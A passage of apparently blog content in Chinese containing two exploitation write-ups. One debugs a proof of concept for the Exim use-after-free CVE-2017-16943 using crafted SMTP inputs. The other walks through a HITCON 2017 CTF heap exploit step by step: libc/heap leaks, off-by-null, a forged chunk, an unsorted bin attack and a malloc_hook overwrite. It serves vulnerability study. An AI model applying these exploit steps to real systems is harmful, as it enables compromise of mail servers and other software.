+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15133016051358khgbdml.png?imageslim" alt="paste image"><br>所以我们可以通过这个 <code>tips</code> 控制一定的内存分配。</p>
+<p>下面通过调试，看看 <code>poc</code> 的流程。</p>
+<p>首先通过发送 无法识别的命令，分配一块大内存，与 <code>top chunk</code> 相邻<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r.sendline(&apos;a&apos;*0x1280+&apos;\x7f&apos;)</div></pre></td></tr></table></figure></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15133020345637juhli14.png?imageslim" alt="paste image"><br>可以看到此时 <code>current_block</code> 中剩下的长度为 <code>0x11b0</code>，而请求的长度 <code>0x1285</code> , 所以会通过 <code>malloc</code> 从系统分配内存，然后在切割返回。执行完后看看堆的状态</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513302261849xvq2lji2.png?imageslim" alt="paste image"></p>
+<p>可以看到，现在的 <code>current_block</code> 的指针就是上一步的 <code>top chunk</code> 的地址，而且现在 <code>current_block</code> 和  <code>top chunk</code> 是相邻的。通过计算可以知道共分配了 <code>0x1288</code> 字节（内存对齐）</p>
+<p>然后通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r.sendline(&apos;b&apos;*0x4000+&apos;:\r\n&apos;)</div></pre></td></tr></table></figure></p>
+<p>构造非常大的 <code>unsorted bin</code>, 原因在于，他这个是先 <code>分配</code> 再 <code>free</code> 的，由于 <code>0x4000</code> 远大于 <code>header_size</code> 的初始值（0x100）, 这样就会触发多次的 <code>store_get</code>, 而且 <code>0x4000</code> 也大于 <code>block</code> 的默认大小（0x2000）, 所以也会触发多次的 <code>malloc</code> ， 在 <code>malloc</code> 以后，会调用 <code>store_release</code> 释放掉之前的块，然后由于这个释放的块和 <code>top chunk</code> 之间有正在使用的块(刚刚调用<code>store_get</code>分配的），所以不会与<code>top chunk</code> 合并，而会把 它放到 <code>unsorted bin</code> 中 ，这样多次以后就会构造一个比较大的 <code>unsorted bin</code>.<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513302702234g88jsg0k.png?imageslim" alt="paste image"></p>
+<p>第一次调用 <code>store_get</code>，进行扩展，可以看到 请求 <code>0x1000</code>, 但是剩余的只有 <code>0x548</code>, 所以会调用 <code>malloc</code> 分配。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513303590249170ixrvk.png?imageslim" alt="paste image"><br>单步步过，查看堆的状态，发现和预期一致</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513303724246jvwjulr8.png?imageslim" alt="paste image"></p>
+<p><code>store_release(next-&gt;text)</code> 之后就有 <code>unsorted bin</code>.<img src="http://oy9h5q2k4.bkt.clouddn.com/151330416633134eomvaf.png?imageslim" alt="paste image"><br>多次以后，就会有一个非常大的 <code>unsorted bin</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513304236832mizmzou3.png?imageslim" alt="paste image"><br>接下来使用 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r.sendline(&apos;a&apos;*0x3480+&apos;\x7f&apos;)</div></pre></td></tr></table></figure>
+<p>再次分配一块大内存内存，使得 <code>yield_length &lt; 0x100</code>， 分配完后 <code>yield_length</code> 变成了 <code>0xa0</code>。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15133050992775d244gih.png?imageslim" alt="paste image"></p>
+<p>下面使用<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513305227882r3xou0k6.png?imageslim" alt="paste image"></p>
+<p>然后会进入 <code>receive_msg</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513305343174he2e9xy6.png?imageslim" alt="paste image"></p>
+<p>首先会分配一些东西。上一步 <code>yield_length</code> 变成了 <code>0xa0</code>， 前面两个都比较小， <code>current_block</code> 可以满足需求。后面的<code>next-&gt;text = store_get(header_size)</code>, header_size最开始 为 0x100, 所以此时会重新分配一个 <code>block</code>，并且 <code>next-&gt;text</code> 会位于 <code>block</code> 的开始。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513305821535dxt8bw6a.png?imageslim" alt="paste image"></p>
+<p>符合预期。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r.sendline(&apos;:BDAT \x7f&apos;)</div></pre></td></tr></table></figure>
+<p>触发 <code>string_printing</code>,分配一小块内存。此时的 <code>current_block</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513306252691g22wjttm.png?imageslim" alt="paste image"></p>
+<p>之后触发漏洞。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15133062969665oyu1sko.png?imageslim" alt="paste image"></p>
+<p>当触发 漏洞代码时， <code>store_extend</code> 会出错，因为 <code>next-&gt;text</code> 和空闲内存之间有在使用的内存。于是会触发 <code>store_get(header_size)</code> ,因为此时 空闲块的空间比较大 （0x1ee0）, 所以会直接切割内存返回，然后 <code>store_release</code> 会释放这块内存。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151330818058602ut39gp.png?imageslim" alt="paste image"></p>
+<p>可以看到<code>current_block</code> 被 <code>free</code> 并且被放到了 <code>unsorted bin</code>, 此时 <code>current_block</code> 的 <code>next</code>  和 <code>length</code>  变成了 <code>main_arena</code> 的地址（可以看看之前  block的结构图）<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513308325076mi9vpvsh.png?imageslim" alt="paste image"></p>
+<p>当再次触发 <code>store_get</code>, 会遍历 <code>block-&gt;next</code>, 拿到 <code>main_arena</code>, 然后切割内存分配给我们<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513308508292aqt1i61a.png?imageslim" alt="paste image"></p>
+<p>之后的 <code>memcpy</code>我们就可以修改<code>main_arena</code>的数据了。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151330875243837hyzkwi.png?imageslim" alt="paste image"></p>
+<p><code>getshell</code> 请看参考链接。（因为我没成功~_~）</p>
+<p><strong>参考</strong></p>
+<p><a href="https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/" target="_blank" rel="external">https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/</a></p>
+<p><a href="https://paper.seebug.org/469/" target="_blank" rel="external">https://paper.seebug.org/469/</a></p>
+<p><a href="https://paper.seebug.org/479/" target="_blank" rel="external">https://paper.seebug.org/479/</a></p>
+<p><a href="https://bugs.exim.org/show_bug.cgi?id=2199" target="_blank" rel="external">https://bugs.exim.org/show_bug.cgi?id=2199</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> Vulnerability analysis </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> CVE-2017-16943 </tag>
+            
+            <tag> exim_uaf </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Pwn with File结构体（三）]]></title>
+      <url>/2017/12/12/pwn_with_file_part3.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<hr>
+<p>前面介绍了几种 <code>File</code> 结构体的攻击方式，其中包括修改 <code>vtable</code>的攻击，以及在最新版本 <code>libc</code> 中 通过 修改 <code>File</code> 结构体中的一些缓冲区的指针来进行攻击的例子。</p>
+<p>本文以 <code>hitcon 2017</code> 的 <code>ghost_in_the_heap</code> 为例子，介绍一下在实际中的利用方式。</p>
+<p>不过我觉得这个题的精华不仅仅是在最后利用 <code>File</code> 结构体 <code>getshell</code> 那块， 前面的通过堆布局，<code>off-by-null</code> 进行堆布局的部分更是精华中的精华，通过这道题可以对 <code>ptmalloc</code> 的内存分配机制有一个更加深入的了解。</p>
+<p>分析的 <code>idb</code> 文件，题目，exp:</p>
+<p><a href="https://gitee.com/hac425/blog_data/tree/master/pwn_file" target="_blank" rel="external">https://gitee.com/hac425/blog_data/tree/master/pwn_file</a></p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>拿到一道题，首先看看保护措施，这里是全开。然后看看所给的各个功能的作用。</p>
+<ul>
+<li><code>new_heap</code>, 最多分配 3个 <code>0xb0</code> 大小的chunk ( <code>malloc(0xA8)</code>)然后可以输入 <code>0xa8</code>个字符，注意调用的 <code>_isoc99_scanf(&quot;%168s&quot;, heap_table[i]);</code> 会在输入串的末尾 添 <code>\x00</code>, 可以 <code>off-by-one</code>.</li>
+<li><code>delete_heap</code> free掉指定的 heap</li>
+<li><code>add_ghost</code> 最多分配一个 <code>0x60</code> 的 chunk (<code>malloc(0x50)</code>), 随后调用 <code>read</code> 获取输入，末尾没有增加 <code>\x00</code> ,可以 <code>leak</code></li>
+<li><code>watch_ghost</code> 调用 <code>printf</code> 打印 <code>ghost</code> 的内容</li>
+<li><code>remove_ghost</code>  free掉 <code>ghost</code> 指针</li>
+</ul>
+<p>总结一下， 我们可以 最多分配 3个 <code>0xb0</code> 大小的 <code>chunk</code>， 以及 一个 <code>0x60</code> 的 <code>chunk</code>，然后 在 分配 <code>heap</code> 有 <code>off-by-one</code> 可以修改下一块的 <code>size</code> 位（细节后面说）， 分配 <code>ghost</code> 时，在输入数据后没有在数据末尾添 <code>\x00</code> ，同时有一个可以获取 <code>ghost</code> 的函数，可以 <code>leak</code> 数据。</p>
+<p>有一个细节需要提一下：</p>
+<p>在程序中 <code>new_heap</code> 时是通过 <code>malloc(0xa8)</code>, 这样系统会分配 <code>0xb0</code> 字节的 <code>chunk</code>, 原因是对齐导致的， 剩下需要的那8个字节由下一个堆块的 <code>pre_size</code> 提供。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15130630121102mpker2n.png?imageslim" alt="paste image"><br><code>0x5555557571c0</code> 是一个 <code>heap</code> 所在 <code>chunk</code> 的基地址， 他分配了 <code>0xb0</code> 字节，位于 <code>0x555555757270</code> 的 8 字节也是给他用的。</p>
+<p><strong>信息泄露绕过 aslr &amp;&amp; 获得 heap 和 libc 的地址</strong></p>
+<p>先放一张信息泄露的草图压压惊</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15130538118666xsytph2.png?imageslim" alt="paste image"></p>
+<p>在堆中进行信息泄露我们可以充分利用堆的分配机制，在堆的分配释放过程中会用到双向链表，这些链表就是通过 <code>chunk</code> 中的指针链接起来的。如果是 <code>bin</code> 的第一个块里面的指针就全是 <code>libc</code> 中的地址，如果 <code>chunk</code> 所属的 <code>bin</code> 有多个 <code>chunk</code> 那么<code>chunk</code> 中的指针就会指向 <code>heap</code> 中的地址。 利用这两个 <code>tips</code> , 加上上面所说的 ，  <code>watch_ghost</code>可以 <code>leak</code> 内存中的数据，再通过精心的堆布局，我们就可以拿到 <code>libc</code> 和 <code>heap</code> 的基地址</p>
+<p>回到这个题目来看，我们条件其实是比较苛刻的，我们只有 <code>ghost</code> 的内存是能够读取的。而 分配 <code>ghost</code> 所得到的 <code>chunk</code> 的大小是 <code>0x60</code> 字节的，这是在 <code>fastbin</code> 的大小范围的， 所以我们释放后，他会进入 <code>fastbin</code> ,由于该<code>chunk</code>是其 所属 <code>fastbin</code> 的第一项， 此时 <code>chunk-&gt;fd</code> 会被设置为 <code>0</code>,  <code>chunk-&gt;bk</code> 内容不变。</p>
+<p>测试一下即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">add_ghost(12345, &quot;s&quot;*0x20)</div><div class="line">new_heap(&quot;s&quot;)</div><div class="line">remove_ghost()</div></pre></td></tr></table></figure></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513055921831mi7kjy5z.png?imageslim" alt="paste image"></p>
+<p>所以单单靠 <code>ghost</code> 是不能实现信息泄露的。</p>
+<p>下面看看正确的思路。</p>
+<p><strong>leak libc</strong></p>
+<p>首先<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">add_ghost(12345, &quot;ssssssss&quot;)</div><div class="line">new_heap(&quot;b&quot;)   # heap 0</div><div class="line">new_heap(&quot;b&quot;)   # heap 1   </div><div class="line">new_heap(&quot;b&quot;)   # heap 2</div><div class="line"></div><div class="line"># ghost ---&gt; fastbin (0x60)</div><div class="line">remove_ghost()</div><div class="line">del_heap(0)</div></pre></td></tr></table></figure></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151305653826347lnu79m.png?imageslim" alt="paste image"></p>
+<p>然后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">del_heap(2)  #触发 malloc cosolidate ， 清理 fastbin --&gt; unsorted, 此时 ghost + heap 0 合并</div></pre></td></tr></table></figure>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513056836802uafbdk5q.png?imageslim" alt="paste image"></p>
+<p>可以看到 <code>fastbin</code> 和 <code>unsorted bin</code> 合并了，具体原因在 <code>_int_free</code> 函数的代码里面。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513056961189b78zrtlx.png?imageslim" alt="paste image"></p>
+<p><code>FASTBIN_CONSOLIDATION_THRESHOLD</code> 的值为 <code>0x10000</code> ,当 <code>free</code>掉  <code>heap2</code> 后，会和 <code>top chunnk</code> 合并，此时的 <code>size</code> 明显大于  <code>0x10000</code>， 所以会进入 <code>malloc_consolidate</code> 清理 <code>fastbin</code> ,所以会和<code>unsorted bin</code> 合并形成了大的 <code>unsorted bin</code>. </p>
+<p>然后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">new_heap(&quot;b&quot;)   # heap 0, 切割上一步生成的 大的 unsorted bin, 剩下 0x60 , 其中包含 main_arean 的指针</div><div class="line">add_ghost(12345, &quot;ssssssss&quot;)  # 填满 fd 的 8 个字节， 调用 printf 时就会打印 main_arean 地址</div></pre></td></tr></table></figure></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513057843165e2wv43ea.png?imageslim" alt="paste image"></p>
+<p>先分配 <code>heap</code> 得到 <code>heap_0</code>, 此时原来的 <code>unsorted bin</code> 被切割， 剩下一个小的的 <code>unsorted bin</code>, 其中有指针 <code>fd</code>, <code>bk</code> 都是指向 <code>main_arean</code>, 然后我们在 分配一个 <code>ghost</code> ，填满 <code>fd</code> 的 <code>8</code> 个字节， 然后调用 <code>printf</code>时就会打印 <code>main_arean</code> 地址。</p>
+<p>调试看看。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513059144543s1cj722q.png?imageslim" alt="paste image"></p>
+<p><code>0x00005555557570c0</code> 是 <code>add_ghost</code> 返回的地址，然后使用 <code>watch_ghost</code>  就能 <code>leak libc</code> 的地址了。具体可以看文末的 <code>exp</code></p>
+<p><strong>leak heap</strong></p>
+<p>如果要 <code>leak heap</code> 的地址，我们需要使某一个 <code>bin</code>中有两个 <code>chunk</code>, 这里选择构造两个 <code>unsorted bin</code>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">new_heap(&quot;b&quot;)   # heap 2</div><div class="line"></div><div class="line">remove_ghost()</div><div class="line">del_heap(0)</div><div class="line">del_heap(2)  # malloc cosolidate ， 清理 fastbin --&gt; unsorted, 此时 ghost + heap 0 合并</div></pre></td></tr></table></figure>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513059632175y6rm23it.png?imageslim" alt="paste image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">new_heap(&quot;b&quot;)   # heap 0</div><div class="line">new_heap(&quot;b&quot;)   # heap 2</div><div class="line"># |unsorted bin 0xb0|heap 1|unsorted bin 0x60|heap 2|top chunk|</div><div class="line"># 两个 unsorted bin  使用双向链表，链接到一起</div><div class="line">del_heap(1)</div><div class="line">new_heap(&quot;b&quot;)   # heap 1 </div><div class="line">del_heap(0)</div></pre></td></tr></table></figure>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513060635255jf7cl5sx.png?imageslim" alt="paste image"><br>构造了两个 <code>unsorted bin</code>, 当 <code>add_ghost</code> 时就会拿到 下面那个 <code>unsorted bin</code>, 它的 <code>bk</code> 时指向 上面那个 <code>unsorted bin</code> 的，这样就可以 <code>leak heap</code> 了，具体看代码（这一步还有个小 <code>tips</code>, 代码里有）。</p>
+<p>我们来谈谈 第一步到第二步为啥会出现 <code>smallbin</code> ,内存分配时，首先会去 <code>fastbin</code> , <code>smallbin</code> 中分配内存，不能分配就会 遍历· <code>unsorted bin</code>, 然后再去 <code>smallbin</code> 找。</p>
+<p>具体流程如下( <a href="http://brieflyx.me/2016/heap/glibc-heap/" target="_blank" rel="external">来源</a> )：</p>
+<ul>
+<li><p>逐个迭代 <code>unsorted bin</code>中的块，如果发现 <code>chunk</code> 的大小正好是需要的大小，则迭代过程中止，直接返回此块;否则将此块放入到对应的 <code>small bin</code> 或者 <code>large bin</code> 中，这也是整个 <code>heap</code> 管理中唯一会将 <code>chunk</code> 放入 <code>small bin</code> 与 <code>large bin</code> 中的代码。</p>
+</li>
+<li><p>迭代过程直到 <code>unsorted bin</code> 中没有 <code>chunk</code> 或超过最大迭代次数( <code>10000</code> )为止。</p>
+</li>
+<li>随后开始在 <code>small bins</code> 与 <code>large bins</code> 中寻找 <code>best-fit</code>，即满足需求大小的最小块，如果能够找到，则分裂后将前一块返回给用户，剩下的块放入 <code>unsorted bin</code> 中。</li>
+<li>如果没能找到，则回到开头，继续迭代过程，直到 <code>unsorted bin</code> 空为止</li>
+</ul>
+<p>所以在第一次 <code>new heap</code> 时 ，<code>unsorted bin</code>进入 <code>smallbin</code> ,然后 被切割，剩下一个 <code>0x60</code> 的<code>unsorted bin</code> ， 再次 <code>new heap</code> ，<code>unsorted bin</code>进入 <code>smallbin</code>，然后在分配 <code>new heap</code> 需要的内存 <code>0xb0</code> , 然后会从 <code>top chunk</code> 分配，于是 出现了 <code>smallbin</code>。</p>
+<p>下面继续</p>
+<p><strong>构造exploit之 off-by-one</strong></p>
+<p>经过上一步我们已经 拿到了 <code>libc</code> 和 <code>heap</code> 的地址。下面讲讲怎么 <code>getshell</code><br>首先清理一下 <code>heap</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">remove_ghost()</div><div class="line">del_heap(1)</div><div class="line">del_heap(2)</div></pre></td></tr></table></figure></p>
+<p>然后初始化一下堆状态<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">add_ghost(12345, &quot;ssssssss&quot;)</div><div class="line">new_heap(&quot;b&quot;)   # heap 0</div><div class="line">new_heap(&quot;b&quot;)   # heap 1   </div><div class="line">new_heap(&quot;b&quot;)   # heap 2</div></pre></td></tr></table></figure></p>
+<p>现在的 <code>heap</code> 是这样的</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513061917788zaualfd9.png?imageslim" alt="paste image"></p>
+<p>然后构建一个较大的 <code>unsorted bin</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">remove_ghost()</div><div class="line">del_heap(0)</div><div class="line">del_heap(2)</div><div class="line">new_heap(&quot;s&quot;)</div><div class="line">new_heap(&quot;s&quot;)</div><div class="line">log.info(&quot;create unsorted bin: |heap 0|unsorted_bin(0x60)|heap 1|heap 2|top chunk|&quot;)</div><div class="line"># pause()</div><div class="line"></div><div class="line">del_heap(0)</div><div class="line">del_heap(1)</div></pre></td></tr></table></figure></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15130621045925vya3mql.png?imageslim" alt="paste image"></p>
+<p>下面使用 <code>off-by-null</code> 进行攻击，先说说这种攻击为啥可以实现，文章开头就说， <code>new_heap</code> 时获取输入，最多可以读取 <code>0xa8</code> 个字节的数据，最后会在末尾添加 <code>0x00</code> ,所以实际上是 <code>0xa9</code> 字节 , 因为  <code>0xa8</code> 字节 时已经用完了 下一个 <code>chunk</code> 的 <code>presize</code> 区域 ， 第<code>0xa9</code>字节就会覆盖 下一个 <code>chunk</code> 的 <code>size</code> 位， 这就是 <code>off-by-null</code>, 具体细节比较复杂，下面一一道来。</p>
+<p>首先触发 <code>off-by-one</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">new_heap(&quot;a&quot;*0xa8)</div></pre></td></tr></table></figure>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513063756553bwp90599.png?imageslim" alt="paste image"></p>
+<p>可以看到，在调用 <code>malloc</code> 分配内存后， <code>heap_0</code> 在 <code>heap</code>  的开头分配，然后在 偏移 <code>0xb0</code> 位置处有一个 <code>0x110</code> 大小的 <code>unsorted bin</code>，  此时 <code>heap_2</code> 的 <code>pre_size</code> 为 <code>0x110</code>,  <code>pre_inuse</code> 为 <code>0</code>。所以通过 <code>heap_2</code>  找到的 <code>pre chunk</code> 为 <code>0xb0</code> 处开始的 <code>0x110</code> 大小的 <code>chunk</code>.</p>
+<p>然后 <code>off-by-null</code> 后， <code>unsorted bin</code> 的 <code>size</code> 域 变成了 <code>0x100</code> 这就造成了 <code>0x10</code> 大小的 <code>hole</code>.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151306437410482kehtxq.png?imageslim" alt="paste image"></p>
+<p><code>0x5555557571b0</code> 就是 hole.<br>此时 <code>heap_2</code> 的 <code>pre_size</code>  与 <code>pre_inuse</code>没变化。</p>
+<p>在清理下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">new_heap(&quot;s&quot;)</div><div class="line">del_heap(0)</div><div class="line">del_heap(1)</div></pre></td></tr></table></figure></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513065626592mlsrd8by.png?imageslim" alt="paste image"></p>
+<p>这里那两个 <code>unsorted bin</code> 不合并的原因是，系统判定下面那个 <code>unsorted bin</code> ，找到 hole 里面的 第二个 8字节，取它的最低位，为0表示已经释放，为1则未被释放。由于那里值 为 <code>0x3091</code> (不知道从哪来的）,所以系统会认为它还没有被释放。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15130658619712j52ggc3.png?imageslim" alt="paste image"></p>
+<p>此时 <code>heap_2</code> 的 <code>pre_size</code> 为 <code>0x110</code>,  <code>pre_inuse</code> 为 <code>0</code>。如果我们释放掉 <code>heap2</code> ,系统根据  <code>pre_size</code> 找到 偏移 <code>0xb0</code> ，并且会认为 这个块已经释放（ <code>pre_inuse</code> 为 <code>0</code>）， 然后就会与 <code>heap2</code> 合并，这样就会有 <code>unsorted bin</code> 的交叉情况了。</p>
+<p>要能成功 <code>free heap_2</code> 还需要 偏移 <code>0xb0</code> 处伪造一个 <code>free chunk</code> 来过掉 <code>unlink check</code>.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># fake free chunk</div><div class="line">add_ghost(12345, p64(heap + 0xb0)*2)</div><div class="line">new_heap(p64(0)*8 + p64(0) + p64(0x111) + p64(heap) + p64(heap)) # 0</div><div class="line">new_heap(&quot;s&quot;)  #防止和 top chunk 合并</div><div class="line"></div><div class="line">del_heap(2)</div></pre></td></tr></table></figure></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513066961579hq1ooo7i.png?imageslim" alt="paste image"></p>
+<p>首先分配 <code>ghost</code> ,它的 <code>fd</code> 和 <code>bk</code> 域都是 <code>偏移 0xb0</code> , 然后在 分配 <code>heap</code> ,在 伪造<code>偏移 0xb0</code> <code>free chunk</code> , 使他的 <code>fd</code> 和 <code>bk</code> 都指向 <code>ghost</code> 所在块的基地址。<br>这样就能过掉 <code>unlink</code> 的 检查<br>然后  <code>del_heap(2)</code>, 获得一个 <code>0x1c0</code> 的 <code>unsorted bin</code> , 可以看到此时已经有 <code>free chunk</code> 的交叉情况了。</p>
+<p>下一步，在交叉区域内构造 <code>unsorted bin</code>, 然后 分配内存，修改其中的 <code>bk</code> 进行 <code>unsorted bin</code>攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">del_heap(0)</div><div class="line">new_heap(&quot;s&quot;)  # 0</div><div class="line">new_heap(&quot;s&quot;)  # 2</div><div class="line"></div><div class="line">del_heap(0)</div><div class="line">del_heap(2)</div></pre></td></tr></table></figure>
+<p>首先释放掉 <code>heap0</code> 增加两个<code>heap</code>. ,会出现交叉的。原因有两个 <code>unsorted bin</code>.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513070134752abydywfr.png?imageslim" alt="paste image"></p>
+<p>然后分别释放 <code>heap 0</code>, <code>heap 2</code>,注意在释放 <code>heap 0</code> 的时候，由于画红圈标注的那个 <code>smallbin</code> 中的 <code>pre_inuse</code> 为 1， 所以 它上面的那个 <code>smallbin</code>  没有和 <code>unsorted bin</code> 合并， 原因在于，上一步 <code>new_heap(&quot;s&quot;)  # 2</code> 时 ， 切割完后，剩下 <code>chunk</code> 开头正好是 画红圈标注的那个 <code>smallbin</code>, 就会设置 它的 <code>pre_inuse</code> 为 1。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513070709047o8ozvocv.png?imageslim" alt="paste image"></p>
+<p>最后我们有了两个 <code>unsorted bin</code>.再次分配 <code>heap</code> 时，会先分配到位于 <code>0x60</code>,大小为 <code>0xb0</code> 的 <code>unsorted bin</code>,此时我们就可以修改 位于 <code>0xb0</code> 大小为 <code>0x1c0</code> 的  <code>unsorted bin</code>的首部，进而 进行  <code>unsorted bin</code> 攻击。</p>
+<p><strong>unsorted bin attack</strong></p>
+<p>现在我们已经有了 <code>unsorted bin</code> 攻击的能力了，目前我知道的攻击方式如下。</p>
+<ul>
+<li>修改 <code>global_max_fast</code> ，之后使用 <code>fastbin</code> 攻击, 条件不满足 （x）</li>
+<li>house_of_orange , 新版 libc 校验 (x)</li>
+<li>修改 <code>stdin-&gt;_IO_base_end</code>, 修改 <code>malloc_hook</code>. ( ok )</li>
+</ul>
+<p>在调用 <code>scanf</code> 获取输入时，首先会把输入的东西复制到 <code>[_IO_base_base, _IO_base_end]</code>, 最大大小为 <code>_IO_base_end - _IO_base_base</code>。<br>修改  <code>unsorted bin</code>  的 <code>bck</code> 为 <code>_IO_base_end-0x10</code> ,就可以使 <code>_IO_base_end=main_arens+0x88</code>,我们就能修改很多东西了，而且 <code>malloc_hook</code> 就在这里面。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 修改 unsorted bin </div><div class="line">new_heap(p64(0)*8 + p64(0) + p64(0xb1) + p64(0) + p64(buf_end-0x10))</div><div class="line"># 触发unsorted bin attack, 然后输入内容，修改 malloc_hook 为 magic</div><div class="line">new_heap((&quot;\x00&quot;*5 + p64(lock) + p64(0)*9 + p64(vtable)).ljust(0x1ad,&quot;\x00&quot;)+ p64(magic))</div></pre></td></tr></table></figure>
+<p>注意 <code>unsorted bin</code> 的 <code>size</code> 域 一定要修改为 <code>0xb1</code>, 原因是 分配内存时如果 <code>smallbin</code>, <code>fastbin</code>都不能分配，就会遍历 <code>unsorted bin</code> ,如果找到大小完全匹配的就直接返回，停止遍历，否则会持续性遍历，此时的 <code>bck</code> 已经被修改为 <code>_IO_base_end-0x10</code>, 如果遍历到这个, 会 <code>check</code> ,具体原因可以自行调试看。</p>
+<p>我们接下来需要分配<code>heap</code> 大小 为 <code>0xb0</code>, 设置<code>size</code> 域为 <code>0xb1</code>，  会在 <code>unsorted bin</code> 第一次遍历后直接返回。不会报错。此时<code>unsorted bin</code>完成。</p>
+<p><code>magic</code> 可用 <code>one_gadget</code> 查找。<br>最后 <code>del_heap(2)</code> 触发 <code>malloc</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># 此时 unsorted bin 已经损坏， del heap 2触发</div><div class="line"># 堆 unsorted bin的操作</div><div class="line"># 触发 malloc_printerr </div><div class="line"># malloc_printerr 里面会调用 malloc </div><div class="line">del_heap(2)</div></pre></td></tr></table></figure></p>
